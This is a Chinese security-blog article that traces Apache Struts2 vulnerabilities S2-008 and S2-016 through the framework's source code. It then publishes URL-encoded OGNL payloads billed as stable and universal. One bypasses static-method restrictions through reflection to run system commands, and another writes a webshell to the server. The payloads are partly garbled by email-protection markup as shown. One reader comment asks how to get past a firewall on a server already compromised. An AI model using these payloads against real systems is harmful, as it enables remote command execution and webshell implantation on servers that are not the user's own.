<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">struts2最近几个漏洞分析&amp;稳定利用payload</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">genxor</a> <span class="bull">·</span> <time title="2014/02/11 11:48" ui-time="" datetime="2014/02/11 11:48" class="published ng-binding ng-isolate-scope">2014/02/11 11:48</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><p>weibo:<a href="http://weibo.com/u/2296090825">genxor</a></p><h2>0x00 背景</h2><hr><p>看到网上关于struts2利用的文章非常多，但是对于漏洞触发跟踪分析的文档比较少，闲来无事跟踪了一下struts最近吵得比较火的两个漏洞，研究了一下能够稳定利用的payload。</p><h2>0x01 S2-008</h2><hr><p>Struts2框架存在一个devmode模式，方便开发人员调试程序，但是默认devmode是不开启的，如果想要使用，需要手动修改参数，可以将struts.properties中的devmode设置为true，或是在struts.xml中添加如下代码，</p><pre><code>&lt;constant name="struts.devMode" value="true" /&gt; 
</code></pre><p>实际上devmode依赖于struts2底层的struts2-core.jar中的DebuggingInterceptor.java实现，然后漏洞也存在于此程序中。这里我以debug=command这个逻辑下，测试漏洞，我的POC如下所示：</p><pre><code>http://localhost:8080/S2-016/hello.action?debug=command&amp;expression= %23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="053766203736632b76607120373d2037365a6860686760774466666076762037667177706020373c20376620373664203661456f6473642b69646b622b57706b716c">[email&#160;protected]</a><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="aac7cfeacdcfdef8dfc4dec3c7cf">[email&#160;protected]</a>%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2c%23b%3dnew java.io.InputStreamReader%28%23a%29%2c%23c%3dnew java.io.BufferedReader%28%23b%29%2c%23d%3dnew char%5b50000%5d%2c%23c.read%28%23d%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%23d%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29 
</code></pre><p>首先，这里是devmode的几种模式，</p><p><img alt="enter image description here" img-src="03d9c20784c773768adcd0a1faed175925625251.jpg"></p><p>继续跟踪DebuggingInterceptor.java的代码，发现问题出在下面这个逻辑当中</p><p><img alt="enter image description here" img-src="a00826f185c9c5ae76281fbe36985909aff44a24.jpg"></p><p>跟踪参数如图</p><p><img alt="enter image description here" img-src="8c6ced448d0d26d189b5f3ee5da41fb371e2b428.jpg"></p><p>可以看到这里</p><pre><code>String cmd = getParameter(EXPRESSION_PARAM); 
… 
writer.print(stack.findValue(cmd)); 
</code></pre><p>这里cmd没做任何处理，后面直接findValue（findValue能够执行OGNL表达式，具体参考官方文档），导致OGNL表达式执行。</p><p>关于这个漏洞执行，其实没什么好说的，关键是这个payload调用java反射类(可以访问一些私有成员变量)绕过了struts2限制执行java静态方法的规则法的规则，使之前apache官方的修复又白费了。因为struts2在2.3.14.1版本之后便设置#_memberAccess[“allowStaticMethodAccess”]为不可修改，而要调用java静态方法，必须要设置allowStaticMethodAccess为true才可以。这里使用</p><pre><code>#f = #_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess')
#f.setAccessible(true) 
#f.set(#_memberAccess, true) 
</code></pre><p>这里使用java的反射机制绕过了限制。另外，还有利用java.lang.ProcessBuilder类的start()方法来实现（ProcessBuilder类是用来创建系统进程的，每个实例管理一个进程属性集合，start方法用来创建一个新的进程实例，并且可以从相同的实例中反复多次的初始化、创建子进程。随便构造一个java.lang.ProcessBuilder的实例，然后调用它的start()方法，便达到命令执行的目的），但这个算是另一种思路，并没有从根本上修改#_memberAccess[“allowStaticMethodAccess”]的值。</p><h2>0x02 S2-016</h2><hr><p>在struts2中，DefaultActionMapper类支持以"action:"、"redirect:"、"redirectAction:"作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令。</p><p>这里以“redirect:”前缀举例，struts2会将“redirect:”前缀后面的内容设置到redirect.location当中，这里我们一步步跟踪，首先是这个getMapping函数跟入</p><p><img alt="enter image description here" img-src="84ef4ced5fc44d660a17783ee6cbb2d00d282a73.jpg"></p><p>这里一直到这个handleSpecialParameters()，继续跟入</p><p><img alt="enter image description here" img-src="86930e2407dab17199e2737daea225f95b1aded7.jpg"></p><p><img alt="enter image description here" img-src="dd3c85c47b140c754aabed01f7cb51eaaaae3a1b.jpg"></p><p>这里真正传入OGNL表达式是在这个parameterAction.execute()中，继续跟入来到DefaultActionMapper.java的代码</p><p><img alt="enter image description here" img-src="5cd810b36911ef35fec9d335a40d1c259e35db1c.jpg"></p><p>这里key.substring(REDIRECT_PREFIX.length())便是前缀后面的内容也就是OGNL表达式，struts2会调用setLocation方法将他设置到redirect.location中。然后这里调用mapping.setResult(redirect)将redirect对象设置到mapping对象中的result里，如图所示</p><p><img alt="enter image description here" img-src="f4d5461d144b469601b6c4e8ae6dee508a62c685.jpg"></p><p>然而上面的过程只是传递OGNL表达式，真正执行是在后面，这里是在FilterDispatcher类中的dispatcher.serviceAction()方法，这里的mapping对象中设置了传入的OGNL</p><p><img alt="enter image description here" img-src="641e1bbe96e1efbacf1d82202f0fc20754b1218c.jpg"></p><p>这里跟入方法最终会在TextParseUtil这个类的调用stack.findValue()方法执行OGNL。</p><p><img alt="enter image description here" img-src="ffdb359c5d262c9a58b880fb4ebe4d7ceb426a83.jpg"></p><h2>0x03 PAYLOAD</h2><hr><p>这里我结合之前几个漏洞凑出一个通用payload，目前测试还是很稳定的</p><p>命令执行</p><pre><code>%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="784a1b5d4a4b1e560b1d0c5d4a405d4a4b27151d151a1d0a391b1b1d0b0b5d4a1b0c0a0d1d5d4a415d4a1b5d4a4b195d4b1c3812190e19561419161f562a0d160c11">[email&#160;protected]</a><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="ed8088ad8a8899bf988399848088">[email&#160;protected]</a>%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2c%23b%3dnew java.io.InputStreamReader%28%23a%29%2c%23c%3dnew java.io.BufferedReader%28%23b%29%2c%23d%3dnew char%5b50000%5d%2c%23c.read%28%23d%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%23d%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29
</code></pre><p>Getshell</p><pre><code>%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23a%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletRequest%22%29%2c%23b%3dnew+java.io.FileOutputStream%28new%20java.lang.StringBuil<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="d5b1b0a7f0e7edf0e7e6b4fbb2b0a187b0b4b985b4a1bdf0e7edf0e7e7faf0e7e7f0e7ecf0e7ecfbb4a5a5b0bbb1f0e7ed95bfb4a3b4fbbcbafb93bcb9b0">[email&#160;protected]</a>@<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="7a091f0a1b081b0e15085f4843541b0a0a1f141e5f48425f48491b541d1f0e2a1b081b171f0e1f085f48425f4848141b171f5f48485f48435f4843540e15290e0813">[email&#160;protected]</a><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="4e20296b7c766b7c776b7c776b7c2d6b7c7d2c60393c273a2b6b7c766b7c7d2f60292b3a1e2f3c2f232b3a2b3c6b7c766b7c7c3a6b7c7c6b7c7760292b3a0c373a2b">[email&#160;protected]</a><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="562573646e73646f73646f7364357364653478353a39253373646e73646f7364357364653133382e392473653273646535393822332e227831332273646e73646435">[email&#160;protected]</a><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="d1bebcffbea1b4bfa2a8bca1b9bebfa8ffa9a6bea3bae3ffb5b8a2a1b0a5b2b9b4a3ff99a5a5a182b4a3a7bdb4a583b4a2a1bebfa2b4f4e3e3f4e3e8ffb6b4a586a3">[email&#160;protected]</a><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="93fae7f6e1b6a1abb6a1aab6a1f0b6a1a0f4f6fdebfce1bde3e1fafde7fffdb6a1abb6a1a1d1daddd4dcb6a1a1b6a1aab6a1f0b6a1a0f4f6fdebfce1bdf5ffe6e0fb">[email&#160;protected]</a>%28%29%2c%23genxor.close%28%29
</code></pre><p>同时在之前的struts2exp这个程序基础上修改出一个exp，整合了近几年出现的几个高危漏洞,</p><p><img alt="enter image description here" img-src="49e98d5c57e350a9e8e13b1373675990722daaa5.jpg"></p><p>程序先不公开放出，大家可以自己用语句测试自己的服务器是否有该问题。</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/web/7550" rel="bookmark" id="re1">Bool型SSRF的思考与实践</a></li><li><a href="http://drops.wooyun.org/papers/5107" rel="bookmark" id="re2">ElasticSearch Groovy脚本远程代码执行漏洞分析（CVE-2015-1427）</a></li><li><a href="http://drops.wooyun.org/tips/347" rel="bookmark" id="re3">攻击JavaWeb应用[5]-MVC安全</a></li><li><a href="http://drops.wooyun.org/papers/914" rel="bookmark" id="re4">J2EE远程代码执行那些事儿(框架层面)</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">BlackStone</span> <span class="reply-time">2015-12-09 16:20:51</span></div><p></p><p>我试了下第一个poc 为什么大多数情况都返回显示 null 只有少量几次正确返回</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">sOnsec</span> <span class="reply-time">2015-08-18 14:09:11</span></div><p></p><p>学习了，顺路求个工具</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">c4bbage</span> <span class="reply-time">2015-02-27 08:51:27</span></div><p></p><p>棒</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Ivan</span> <span class="reply-time">2014-07-09 15:06:07</span></div><p></p><p>这个mark一下</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">genxor</span> <span class="reply-time">2014-04-03 18:30:09</span></div><p></p><p>你有新漏洞？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">genxor</span> <span class="reply-time">2014-04-03 18:29:51</span></div><p></p><p>什么意思，你有新漏洞吗？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">酷帥王子</span> <span class="reply-time">2014-03-27 15:03:29</span></div><p></p><p>新的漏洞一次也没用过，我手头有一个可以执行简单的系统命令，不能上传，有防火墙，不知道怎么突破</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小贱人</span> <span class="reply-time">2014-03-19 23:40:59</span></div><p></p><p>调试好棒呀</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Shawn</span> <span class="reply-time">2014-02-20 10:27:41</span></div><p></p><p>这个总结的还算不错，很容易让人懂</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">国士无双</span> <span class="reply-time">2014-02-16 16:16:25</span></div><p></p><p>非常棒！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">mickey</span> <span class="reply-time">2014-02-11 15:03:11</span></div><p></p><p>:)<br>这个还是要顶一下的。学习了。</p><p></p></div></div></div></div></div></main>